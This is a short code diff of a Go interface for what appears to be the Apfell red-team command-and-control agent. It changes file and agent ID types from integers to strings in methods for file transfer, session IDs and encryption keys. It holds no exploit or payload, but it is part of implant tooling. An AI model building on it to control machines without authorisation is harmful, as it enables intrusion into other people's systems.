@@ -33,7 +33,7 @@ type Profile interface {
 	// C2 profile implementation for downloading files
 	Download(task structs.Task, params string)
 	// C2 profile implementation for uploading files
-	Upload(task structs.Task, fileid int) []byte
+	Upload(task structs.Task, fileid string) []byte
 	// C2 profile implementation to generate a unique session ID
 	GenerateSessionID() string
 
@@ -49,8 +49,8 @@ type Profile interface {
 	SetXKeys(exchangingkeys bool)
 	SetUserAgent(ua string)
 	GetUserAgent() string
-	ApfID() int
-	SetApfellID(newID int)
+	ApfID() string
+	SetApfellID(newID string)
 	UniqueID() string
 	SetUniqueID(newUUID string)
 	AesPreSharedKey() string
